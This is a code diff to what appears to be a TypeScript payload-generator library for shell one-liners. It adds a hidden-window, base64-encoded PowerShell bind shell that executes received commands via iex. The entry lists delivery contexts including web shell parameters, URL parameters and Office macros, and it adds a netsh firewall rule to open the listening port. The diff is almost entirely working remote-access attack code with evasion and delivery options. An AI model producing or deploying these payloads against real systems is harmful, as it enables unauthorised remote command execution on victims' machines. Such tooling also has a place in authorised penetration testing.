@@ -9,6 +9,7 @@ const PS_LISTENER = '$listener = [System.Net.Sockets.TcpListener]{BIND_PORT};$li
   "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
   "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
   "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()";
+const FIREWALL = "The Windows firewall may need an allow rule (admin): netsh advfirewall firewall add rule name=\"<name>\" dir=in action=allow protocol=TCP localport=<port>; record the name for cleanup.";
 const ONE_CLIENT = "Most one-liners serve one connection: re-run it after you disconnect. Close it when done; anyone who finds the port gets the shell.";
 
 export const BIND_SHELLS: PayloadDef[] = [
@@ -89,7 +90,21 @@ export const BIND_SHELLS: PayloadDef[] = [
       { token: "iex", explain: "Runs each line you send and returns the output." },
     ],
     listeners: CONNECT,
-    notes: ["Run from cmd. From a PowerShell prompt, base64-encode it (UTF-16LE) like the reverse shell.",
-      "The Windows firewall may need an allow rule (admin): netsh advfirewall firewall add rule name=\"<name>\" dir=in action=allow protocol=TCP localport=<port>; record the name for cleanup.", ONE_CLIENT],
+    notes: ["Run from cmd. From a PowerShell prompt, base64-encode it (UTF-16LE) like the reverse shell: PowerShell TcpListener bind (-e) does.",
+      FIREWALL, ONE_CLIENT],
+  },
+  {
+    // The same listener as bind-ps, encoded: one token with no quotes, so it also runs at a PowerShell prompt and in a macro.
+    id: "bind-ps-b64", generator: "shell", title: "PowerShell TcpListener bind (-e)", os: "windows", shape: "bind",
+    contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"], requires: ["powershell"],
+    template: PS_LISTENER, encodePowerShell: true, defaults: DEFAULTS,
+    parts: [
+      { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks at a PowerShell prompt, in cmd, a URL or a macro." },
+      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
+      { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
+      { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text, here the TcpListener script that listens on the bind port and runs what you send." },
+    ],
+    listeners: CONNECT,
+    notes: ["It keeps running while it listens, so a web request that fires it hangs: that is expected.", FIREWALL, ONE_CLIENT],
   },
 ];
